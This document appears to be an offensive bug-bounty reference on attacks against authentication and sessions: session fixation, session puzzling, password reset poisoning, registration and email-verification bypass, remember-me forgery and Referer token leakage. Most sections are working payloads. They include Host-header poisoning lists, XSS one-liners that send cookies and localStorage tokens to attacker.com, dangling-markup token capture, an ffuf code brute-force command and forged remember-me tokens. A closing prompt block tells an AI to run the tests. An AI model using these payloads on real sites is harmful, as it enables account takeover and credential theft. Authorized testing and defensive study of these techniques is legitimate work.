---
id: "auth-session-attacks"
title: "Authentication & Session Management Attacks Deep Dive"
type: "technique"
category: "web-application"
subcategory: "authentication"
tags: ["session-fixation", "session-puzzling", "password-reset-poisoning", "registration-abuse", "email-verification-bypass", "remember-me", "token-leakage", "referer", "dangling-markup", "deep-dig"]
difficulty: "advanced"
platforms: ["linux", "macos", "windows"]
related: ["account-takeover", "oauth-jwt-saml-bypasses", "crlf-host-header", "race-conditions", "business-logic-flaws"]
updated: "2026-04-14"
---

# Authentication & Session Management Attacks Deep Dive

Comprehensive attack reference for session fixation, session puzzling, password reset poisoning, registration abuse, email verification bypass, insecure remember-me, and token leakage via Referer. Each section includes step-by-step exploitation, real payloads, and bug bounty context.

---

## 1. Session Fixation

The attacker forces a known session ID onto the victim BEFORE authentication. When the victim authenticates, the attacker's pre-set session becomes authenticated.

### 1.1 URL-Based Session Fixation

Easiest vector. Works when the app accepts session IDs in the URL.

```
# Step 1: Attacker generates a session on the target
curl -v https://target.com/login
# Note: Response Set-Cookie: PHPSESSID=attacker_known_session_id

# Step 2: Craft link with session ID embedded
https://target.com/login?PHPSESSID=attacker_known_session_id

# Step 3: Send link to victim. Victim clicks, authenticates.
# Step 4: Attacker uses the same session ID — now authenticated as victim
curl -b "PHPSESSID=attacker_known_session_id" https://target.com/dashboard
```

**Where to look:** PHP apps with `session.use_trans_sid=1`, Java apps with `;jsessionid=` in URL, any framework that accepts session tokens as GET parameters.

### 1.2 Cookie-Based Session Fixation

Requires injecting a cookie into the victim's browser. Needs XSS, CRLF injection, or subdomain control.

```
# Via XSS
<script>document.cookie="PHPSESSID=attacker_known_session;path=/;domain=.target.com"</script>

# Via CRLF injection in a redirect
https://target.com/redirect?url=https://target.com%0d%0aSet-Cookie:%20PHPSESSID=attacker_known_session

# Via meta tag injection (if HTML injection exists)
<meta http-equiv="Set-Cookie" content="PHPSESSID=attacker_known_session;path=/">
```

### 1.3 Cross-Subdomain Session Fixation

Subdomain cookies propagate to the parent domain. If you control ANY subdomain, you can fix sessions on the main app.

```
# Attacker controls blog.target.com (e.g., via subdomain takeover)
# Set cookie with domain=.target.com from the subdomain:

HTTP/1.1 200 OK
Set-Cookie: session=attacker_controlled_value; Domain=.target.com; Path=/

# Victim visits blog.target.com → cookie set for .target.com
# Victim visits app.target.com → attacker's session cookie is sent
# Victim logs in → session is now authenticated
# Attacker uses same session value on app.target.com
```

**Chain:** Subdomain takeover + session fixation = full ATO on main app.

### 1.4 Cookie Jar Overflow Attack

Force the browser to evict the legitimate session cookie by overflowing the cookie jar.

```javascript
// Inject via XSS on any subdomain
// Browsers limit cookies per domain (~50-180 depending on browser)
for (let i = 0; i < 700; i++) {
  document.cookie = `junk${i}=x; Domain=.target.com; Path=/`;
}
// Legitimate PHPSESSID cookie is evicted
// Now set attacker's session:
document.cookie = "PHPSESSID=attacker_session; Domain=.target.com; Path=/";
```

### 1.5 Cookie Domain Scoping Hijack via Host Header

When a server reflects the `Host` or `X-Forwarded-Host` header into the `domain` attribute of a `Set-Cookie` header.

**Vector:**
```bash
curl -s -I -H "X-Forwarded-Host: attacker.com" "https://target.com/"
```

**Vulnerable Response:**
```http
HTTP/1.1 200 OK
Set-Cookie: session=xyz; Domain=attacker.com; Path=/; Secure; HttpOnly
```

**Impact:** The browser scopes the session cookie to the *attacker's* domain. If the attacker can then trick the victim into visiting a malicious page on `attacker.com`, the cookie may be leaked or manipulated, leading to Account Takeover (ATO).

### 1.6 Testing Checklist

```
1. Authenticate, note session ID
2. Log out, check if session ID changes
3. Log in again — does the session ID rotate? If NOT → fixation possible
4. Can you set session ID via URL parameter? (?PHPSESSID=xxx, ;jsessionid=xxx)
5. Does the app accept arbitrary session values you provide in cookies?
6. After authentication, is the pre-auth session ID still valid?
```

**Impact:** Full account takeover. Payout: $500-$5,000+ depending on ease of exploitation and chain.

---

## 2. Session Puzzling / Session Variable Overloading

Different application endpoints write to the SAME session variable for different purposes. An attacker accesses endpoints in unexpected order to bypass auth.

### 2.1 Classic Auth Bypass

```
# Scenario: Password reset sets $_SESSION['user'] = victim_username
# Dashboard checks if $_SESSION['user'] exists (not if they actually logged in)

# Step 1: Go to password reset, enter victim's username
curl -c cookies.txt -X POST https://target.com/forgot-password \
  -d "username=admin"
# Server-side: $_SESSION['user'] = 'admin'

# Step 2: Access authenticated pages using the same session
curl -b cookies.txt https://target.com/dashboard
# Server checks: isset($_SESSION['user']) → true → shows admin dashboard
```

### 2.2 MFA Bypass via Session Puzzling

```
# Step 1: Start login flow, enter valid creds
POST /login → sets $_SESSION['user'] = 'victim', $_SESSION['mfa_required'] = true

# Step 2: Visit password reset page (different flow)
POST /forgot-password?user=victim → sets $_SESSION['user'] = 'victim'
# But this flow does NOT set $_SESSION['mfa_required']

# Step 3: Access /dashboard
# Dashboard checks $_SESSION['user'] exists AND $_SESSION['mfa_required'] !== true
# Since forgot-password never set mfa_required, you bypass MFA
```

### 2.3 Privilege Escalation

```
# Step 1: Register/login as low-priv user
# $_SESSION['user'] = 'attacker', $_SESSION['role'] = 'user'

# Step 2: Visit admin password reset (may be accessible without auth)
POST /admin/reset-password → $_SESSION['user'] = 'admin_user'
# Some apps overwrite the 'user' variable without checking if you're actually that user

# Step 3: Access admin pages
curl -b cookies.txt https://target.com/admin/panel
# $_SESSION['user'] is now 'admin_user' → admin access granted
```

### 2.4 Where to Look

```
- Password reset pages that populate session with user identity
- Multi-step wizards where each step writes to session
- Profile update endpoints that write to session variables
- Any unauthenticated endpoint that writes user-identifying data to session
- Endpoints with ?user= or ?email= that pre-populate session state
- Registration flows that set session vars before email verification
```

### 2.5 Testing Method

```
1. Map every endpoint that reads/writes session variables
2. For each unauthenticated endpoint that WRITES a user identifier to session:
   a. Hit that endpoint with a victim's identifier
   b. Then navigate to authenticated pages
   c. Check if you have access as the victim
3. For multi-step flows, skip steps and go directly to later steps
4. After password reset initiation, try accessing profile/settings/dashboard
```

**Impact:** Auth bypass, MFA bypass, privilege escalation. Payout: $2,000-$15,000+.

---

## 3. Password Reset Poisoning (Advanced)

Beyond basic Host header injection — covering every vector.

### 3.1 Standard Host Header Poisoning

```bash
# Basic — replace Host header
curl -X POST https://target.com/forgot-password \
  -H "Host: attacker.com" \
  -d "email=victim@target.com"

# Victim receives email with: https://attacker.com/reset?token=SECRET_TOKEN
# Attacker's server logs the token
```

### 3.2 X-Forwarded-Host and Friends

When direct Host replacement is blocked, try alternative headers:

```bash
# X-Forwarded-Host (most common bypass)
curl -X POST https://target.com/forgot-password \
  -H "Host: target.com" \
  -H "X-Forwarded-Host: attacker.com" \
  -d "email=victim@target.com"

# Full list of override headers to try
X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-Forwarded-Server: attacker.com
X-HTTP-Host-Override: attacker.com
Forwarded: host=attacker.com
X-Original-URL: /forgot-password
X-Rewrite-URL: /forgot-password

# Double Host header
Host: target.com
Host: attacker.com

# Host with port
Host: target.com:@attacker.com
Host: target.com#@attacker.com

# Absolute URL with different Host
POST https://target.com/forgot-password HTTP/1.1
Host: attacker.com
```

### 3.3 Partial Host Header Poisoning

Some apps append the Host to a hardcoded base URL — inject into the host:

```bash
# Subdirectory injection
Host: target.com/attacker.com

# Port-based injection  
Host: target.com:443@attacker.com

# Results in: https://target.com:443@attacker.com/reset?token=xxx
# Browser interprets target.com:443 as username, navigates to attacker.com
```

### 3.4 Dangling Markup in Reset Emails

When you can inject partial HTML into reset emails (via name field, Host header, etc.) but CSP blocks full XSS:

```html
<!-- Inject unclosed img tag — everything after it becomes the src URL -->
<img src="https://attacker.com/capture?

<!-- Email HTML continues with the token... -->
<a href="https://target.com/reset?token=SECRET">Reset password</a>

<!-- Browser reads everything between the injected img src and next quote as URL -->
<!-- Attacker receives: https://attacker.com/capture?...<a href="https://target.com/reset?token=SECRET -->
```

```bash
# Inject via Host header with dangling markup
curl -X POST https://target.com/forgot-password \
  -H 'Host: target.com:<a href="//attacker.com/?' \
  -d "email=victim@target.com"

# If the app puts Host:port in the email link:
# https://target.com:<a href="//attacker.com/?/reset?token=SECRET"...
# The href captures the token as part of its URL
```

### 3.5 Reset Token via Referer Leakage

```
Step 1: Victim clicks password reset link
        https://target.com/reset?token=SECRET_TOKEN

Step 2: Reset page loads external resources (analytics JS, social buttons, ads)
        Browser sends: Referer: https://target.com/reset?token=SECRET_TOKEN

Step 3: Third-party receives the full URL with token in Referer header

Step 4: If attacker controls or compromises any third-party resource,
        they harvest reset tokens from Referer logs
```

```bash
# Check what external resources a reset page loads:
curl -s https://target.com/reset?token=test | grep -oP '(src|href)="https?://[^"]*"' | grep -v target.com
# Any external domain = potential Referer leak
```

### 3.6 Testing Payloads — All Host Header Variants

```http
POST /forgot-password HTTP/1.1
Host: attacker.com
---
Host: target.com
X-Forwarded-Host: attacker.com
---
Host: target.com
X-Host: attacker.com
---
Host: target.com
X-Forwarded-Server: attacker.com
---
Host: target.com
Forwarded: host=attacker.com
---
Host: target.com
Host: attacker.com
---
Host: target.com:@attacker.com
---
Host: target.com%00.attacker.com
---
Host: target.com%23@attacker.com
```

**Impact:** Full ATO with zero-click (victim just reads email) or one-click (victim clicks link). Payout: $800-$10,000+. HackerOne reports show $800-$5,000 typical range.

---

## 4. Registration / Signup Abuse

### 4.1 Email Normalization Bypass

Email providers handle addresses differently. Apps that don't normalize consistently create duplicate account opportunities.

```
# Gmail dots don't matter (all deliver to the same inbox)
victim@gmail.com
v.ictim@gmail.com
v.i.c.t.i.m@gmail.com
vi.ct.im@gmail.com

# Gmail plus addressing (sub-addressing)
victim+anything@gmail.com
victim+test123@gmail.com

# If the app treats these as different users but they all go to
# the same inbox, attacker creates a duplicate account for victim's email
```

```bash
# Test: Register with dot variation
curl -X POST https://target.com/register \
  -d "email=v.i.c.t.i.m@gmail.com&password=attacker123&name=Attacker"

# If registration succeeds, the app thinks it's a different user
# But email verification goes to the same inbox (victim@gmail.com)
# Result: Two accounts bound to same real email
```

### 4.2 Unicode / Homoglyph Username Tricks

```
# Unicode normalization — characters that look identical but aren't
admin           # ASCII 'a'
аdmin           # Cyrillic 'а' (U+0430)
ɑdmin           # Latin alpha 'ɑ' (U+0251)
admіn           # Cyrillic 'і' (U+0456) instead of Latin 'i'

# Full-width characters
admin   → ａｄｍｉｎ (U+FF41 etc.)

# Email with Unicode local part
victim@target.com
víctim@target.com    # 'i' with acute accent
vıctim@target.com    # Turkish dotless 'i' (U+0131)
```

```bash
# Register with Unicode-confusable email
curl -X POST https://target.com/register \
  -H "Content-Type: application/json" \
  -d '{"email":"vıctim@target.com","password":"attacker123"}'

# If the app normalizes NFKC on login but not registration (or vice versa):
# Registration: vıctim@target.com → treated as new user
# Login: after NFKC normalization → maps to victim@target.com → ATO
```

### 4.3 Case Sensitivity Abuse

```bash
# Test case sensitivity in email handling
curl -X POST https://target.com/register -d "email=VICTIM@target.com&password=test"
curl -X POST https://target.com/register -d "email=Victim@target.com&password=test"
curl -X POST https://target.com/register -d "email=victim@TARGET.COM&password=test"

# If any succeed → duplicate account for same email
# Then test login with original casing to see if accounts merge or conflict
```

### 4.4 Trailing/Leading Space Manipulation

```bash
# Register with trailing space
curl -X POST https://target.com/register \
  -d "username=admin%20&password=attacker123"
# URL-encoded space at end

# Some apps trim on display but not on uniqueness check
# Creates "admin " as separate user from "admin"
# But displayed as "admin" everywhere → impersonation

# Also try null bytes
curl -X POST https://target.com/register \
  -d "username=admin%00&password=attacker123"
```

### 4.5 Phone Number Normalization

```
# Same number, different formats
+14155551234
14155551234
(415) 555-1234
415-555-1234
415.555.1234
+1 415 555 1234
004155551234    # With country code prefix variation

# International format variations
+44 7700 900000
0044 7700 900000
07700 900000    # Without country code
```

### 4.6 Duplicate Account Race Condition

```bash
# Send two registration requests simultaneously for the same email
# Using curl parallel or Burp Intruder/Turbo Intruder

# Terminal 1:
curl -X POST https://target.com/register \
  -d "email=victim@target.com&password=attacker_pass" &

# Terminal 2 (simultaneously):
curl -X POST https://target.com/register \
  -d "email=victim@target.com&password=attacker_pass2" &

# Race condition: both pass uniqueness check before either INSERT completes
# Result: two accounts with same email, different passwords
```

### 4.7 OAuth Account Linking Abuse

```
1. Register account on target with email victim@target.com
2. Don't verify the email
3. Victim registers later with OAuth (Google/GitHub) using victim@target.com
4. Some apps merge/link accounts → attacker's password still works
5. Attacker logs in with email+password → has access to victim's OAuth-linked account
```

**Impact:** Account takeover, impersonation, privilege escalation. Payout: $500-$10,000+.

---

## 5. Email Verification Bypass

### 5.1 Race Condition Bypass

```bash
# Attack: Change email and access verified resources before verification completes

# Step 1: Login as attacker, capture the "change email" request
POST /settings/email HTTP/1.1
Cookie: session=attacker_session
Content-Type: application/json

{"new_email":"victim@target.com"}

# Step 2: Send multiple concurrent requests to create a race
# Using Turbo Intruder or parallel curl:
for i in $(seq 1 20); do
  curl -X POST https://target.com/settings/email \
    -b "session=attacker_session" \
    -d "new_email=victim@target.com" &
done
wait

# In some apps, the email changes to victim@target.com before verification
# because the race bypasses the "pending verification" state
```

### 5.2 Verification Code Brute Force

```bash
# If verification code is 4-6 digits with no rate limiting:
# 4 digits = 10,000 combinations
# 6 digits = 1,000,000 combinations

# Using ffuf:
ffuf -u https://target.com/verify -X POST \
  -H "Cookie: session=attacker_session" \
  -d "code=FUZZ" \
  -w <(seq -w 000000 999999) \
  -mc 200,302 -t 100

# Using Burp Intruder with Pitchfork attack:
# Payload: Numbers 000000-999999
# Look for different response length or status code on valid code
```

### 5.3 Verification Link Prediction

```bash
# Check if verification tokens are predictable:
# Request multiple verifications, analyze tokens:
token1=a1b2c3d4e5f6
token2=a1b2c3d4e5f7  # Sequential? 
token3=a1b2c3d4e5f8  # Pattern?

# MD5-based tokens:
# Token = MD5(email) or MD5(email + timestamp)
echo -n "victim@target.com" | md5sum
echo -n "victim@target.com1713052800" | md5sum  # With Unix timestamp

# UUID v1 tokens (time-based, predictable):
# Extract time component, generate adjacent UUIDs
```

### 5.4 Re-binding Email

```
1. Register with attacker@attacker.com, verify it
2. Change email to victim@target.com (pending verification)
3. The app may already associate victim@target.com with attacker's account
4. If victim later registers with victim@target.com:
   a. App says "email already in use" → DoS
   b. App merges accounts → ATO
   c. App sends verification to attacker's verified session → ATO
```

### 5.5 Response Manipulation

```bash
# Intercept verification response in Burp
# Change HTTP 403 → 200
# Change {"verified": false} → {"verified": true}
# Change {"status": "error"} → {"status": "success"}

# Some apps check verification client-side only
# The server may not re-validate on subsequent requests
```

### 5.6 Verification Token Reuse

```bash
# After using a verification token:
# Can you use it again? For a different email?

# Step 1: Register attacker@attacker.com, receive token ABC123
# Step 2: Use token ABC123 to verify
# Step 3: Change email to victim@target.com
# Step 4: Try reusing token ABC123 on the verification endpoint
curl https://target.com/verify?token=ABC123&email=victim@target.com
```

### 5.7 Parameter Tampering

```bash
# Modify email parameter in verification request
# Original: /verify?token=ABC123&email=attacker@attacker.com
# Tampered: /verify?token=ABC123&email=victim@target.com

# IDOR in verification:
# Original: /verify?user_id=1337&code=123456
# Tampered: /verify?user_id=1338&code=123456
# (Victim's user_id with attacker's valid code)
```

**Impact:** Account takeover, email hijacking. Payout: $500-$7,500+.

---

## 6. Insecure "Remember Me" Tokens

### 6.1 Predictable Token Construction

```bash
# Step 1: Create test accounts, extract remember-me cookies
curl -v -X POST https://target.com/login \
  -d "username=testuser1&password=test123&remember=true" 2>&1 | grep "Set-Cookie"
# Set-Cookie: remember=dGVzdHVzZXIxOjE3MTMwNTI4MDA=

# Step 2: Decode the token
echo "dGVzdHVzZXIxOjE3MTMwNTI4MDA=" | base64 -d
# Output: testuser1:1713052800
# Pattern: username:unix_timestamp

# Step 3: Forge token for victim
echo -n "admin:1713052800" | base64
# Output: YWRtaW46MTcxMzA1MjgwMA==

curl -b "remember=YWRtaW46MTcxMzA1MjgwMA==" https://target.com/dashboard
# → Logged in as admin
```

### 6.2 Common Token Patterns to Check

```
# Base64(username:timestamp)
echo -n "admin:$(date +%s)" | base64

# Base64(username:MD5(password))
echo -n "admin:$(echo -n 'password123' | md5sum | cut -d' ' -f1)" | base64

# MD5(username + secret)  — if you can guess the secret
echo -n "admin:secretkey" | md5sum

# Hex-encoded username
echo -n "admin" | xxd -p

# JWT with weak/no signing
# Decode: echo "token" | cut -d. -f2 | base64 -d
```

### 6.3 Token Not Invalidated on Password Change

```bash
# Step 1: Login with remember-me, save the token
TOKEN="remember_me_cookie_value"

# Step 2: Change password
curl -X POST https://target.com/change-password \
  -b "session=current_session" \
  -d "old_password=test123&new_password=newpass456"

# Step 3: Test if old remember-me token still works
curl -b "remember=$TOKEN" https://target.com/dashboard
# If you're still logged in → the token wasn't invalidated

# Impact: If attacker ever steals a remember-me token (XSS, network sniffing),
# changing password doesn't revoke their access
```

### 6.4 Token Theft via XSS

```javascript
// Steal remember-me cookie via XSS
// If cookie is NOT HttpOnly:
new Image().src = "https://attacker.com/steal?c=" + document.cookie;

// If cookie IS HttpOnly but stored in localStorage:
fetch("https://attacker.com/steal?t=" + localStorage.getItem("rememberToken"));

// Persistent access: Stolen remember-me token works even after
// victim closes browser and their session expires
```

### 6.5 Token Scope Issues

```bash
# Check cookie attributes:
# - Missing Secure flag → stolen over HTTP
# - Missing HttpOnly → stolen via XSS
# - Domain=.target.com → accessible from any subdomain
# - SameSite=None → sent in cross-site requests

# Inspect cookie in browser:
document.cookie  # If visible → not HttpOnly

# Test over HTTP (if Secure flag missing):
curl http://target.com/dashboard -b "remember=stolen_token"
```

**Impact:** Persistent account takeover that survives password changes. Payout: $500-$5,000+.

---

## 7. Token Leakage via Referer Header

### 7.1 Password Reset Token Leakage

```bash
# Step 1: Request password reset for victim
curl -X POST https://target.com/forgot-password \
  -d "email=victim@target.com"

# Step 2: Check if the reset page loads external resources
curl -s "https://target.com/reset?token=EXAMPLE_TOKEN" | \
  grep -oP '(src|href|action)="https?://(?!target\.com)[^"]*"'

# Any external resource load = Referer leak
# The Referer header sent to each external resource contains:
# Referer: https://target.com/reset?token=SECRET_TOKEN

# Step 3: If you control any of those external resources (ad network, 
# analytics, social widget), you receive the token in access logs
```

### 7.2 OAuth Token Leakage

```
# OAuth callback URL with token in fragment or query:
https://target.com/callback#access_token=eyJhb...

# If callback page loads external resources:
# Referer: https://target.com/callback#access_token=eyJhb...
# NOTE: Fragment (#) is NOT sent in Referer by default
# BUT query parameters (?access_token=) ARE sent

# Vulnerable pattern:
https://target.com/callback?access_token=eyJhb...&token_type=bearer
# This WILL leak via Referer to any external resource on the callback page
```

### 7.3 Referrer Policy Override Exploit

```
# Default browser policy: strict-origin-when-cross-origin
# Only sends origin (not full path) cross-origin
# BUT if the page sets a permissive policy:

# Check response headers:
curl -sI https://target.com/reset?token=test | grep -i referrer-policy
# Vulnerable: Referrer-Policy: unsafe-url
# Vulnerable: Referrer-Policy: no-referrer-when-downgrade
# Vulnerable: (header absent — browser default varies)

# Per-element override (if you can inject HTML):
<a href="https://attacker.com" referrerpolicy="unsafe-url">Click here</a>
# Sends full Referer including token to attacker.com

# HTTP Link header injection for preload:
Link: <https://attacker.com/track>; rel=preload; referrerpolicy=unsafe-url
# Browser preloads the URL with full Referer
```

### 7.4 API Key Leakage

```bash
# API endpoints that include keys in URLs:
https://api.target.com/v1/data?api_key=sk_live_xxx123

# If the API response includes links to external resources,
# or if the client-side JS makes requests to third parties
# after receiving the API response, the key leaks via Referer

# Scan for API keys in URLs:
curl -s https://target.com/app.js | grep -oP 'api[_-]?key[=:]["'"'"']\K[^"'"'"']+'
```

### 7.5 Session Token in URL

```
# Some apps pass session in URL (legacy apps, email links):
https://target.com/dashboard?sid=abc123def456

# Every external resource load on that page leaks the session:
# <img src="https://analytics.com/pixel.gif">
# → Referer: https://target.com/dashboard?sid=abc123def456

# Check for tokens in URLs:
# Browser history, proxy logs, server access logs all capture these
```

### 7.6 Testing for Referer Leakage

```bash
# 1. Find pages with tokens in URLs
# (reset pages, OAuth callbacks, API endpoints, verification links)

# 2. Check if those pages load external resources
curl -s "https://target.com/page-with-token" | \
  grep -oP 'https?://(?!target\.com)[^\s"'"'"'>]+'

# 3. Check Referrer-Policy
curl -sI "https://target.com/page-with-token" | grep -i referrer

# 4. Set up a server to capture Referer headers:
python3 -m http.server 8080  # Check access logs for Referer

# 5. If you can inject content on the page (HTML injection):
<img src="https://attacker.com/capture" referrerpolicy="unsafe-url">
```

**Impact:** Token/credential theft. Payout: $300-$5,000+ depending on what token leaks.

---

## 8. Advanced Chaining Techniques

### Chain 1: Subdomain Takeover → Session Fixation → ATO
```
1. Find dangling CNAME (subdomain takeover)
2. Claim the subdomain
3. Set session cookie with Domain=.target.com
4. Victim visits your subdomain, gets fixated cookie
5. Victim goes to main app, logs in with your session ID
6. You now share their authenticated session
```

### Chain 2: Registration Abuse → Session Puzzling → Admin Access
```
1. Register with Unicode-confusable admin email
2. Access password reset with admin's real email
3. Session variable set to admin identity
4. Navigate to admin panel — session puzzling grants access
```

### Chain 3: HTML Injection → Dangling Markup → Token Theft
```
1. Find HTML injection in user-controlled field (name, bio, etc.)
2. Inject dangling img tag: <img src="https://attacker.com/?
3. When password reset email includes this field + token,
   the token becomes part of the injected URL
4. Attacker receives token in server logs
```

### Chain 4: XSS → Remember-Me Theft → Persistent ATO
```
1. Find XSS (even self-XSS via CSRF)
2. Steal remember-me cookie
3. Use token for persistent access
4. Token survives password change → permanent ATO
```

### Chain 5: Email Verification Race → Account Binding → ATO
```
1. Start email change to victim@target.com
2. Race condition: send 20 concurrent requests
3. Email changes before verification
4. Now own victim's email on the platform
5. Password reset → full ATO
```

---

## Deep Dig Prompts

```
Given this application's authentication system [describe all auth flows]:
1. Test session fixation: authenticate, check if session ID rotates. Try URL/cookie-based fixation.
2. Map ALL endpoints that write user-identifying data to session variables.
3. Test session puzzling: hit password reset, then navigate to authenticated pages.
4. Test password reset with every Host/X-Forwarded-Host variant listed above.
5. Check if reset page loads external resources (Referer leak).
6. Register with email normalization variants (dots, plus, unicode, case).
7. Test email verification for race conditions, code brute-force, token reuse.
8. Decode remember-me cookies. Check if they survive password change.
9. Chain any two findings for higher impact.
```

## Tools

- **Burp Suite + Param Miner** — Host header fuzzing, session analysis
- **SAML Raider** — Burp extension for SAML testing
- **Turbo Intruder** — Race condition testing
- **ffuf** — Verification code brute force
- **CRLFuzz** — CRLF injection scanning for cookie injection
- **Autorize** — Session management testing
- **Cookie Editor** — Browser extension for cookie manipulation
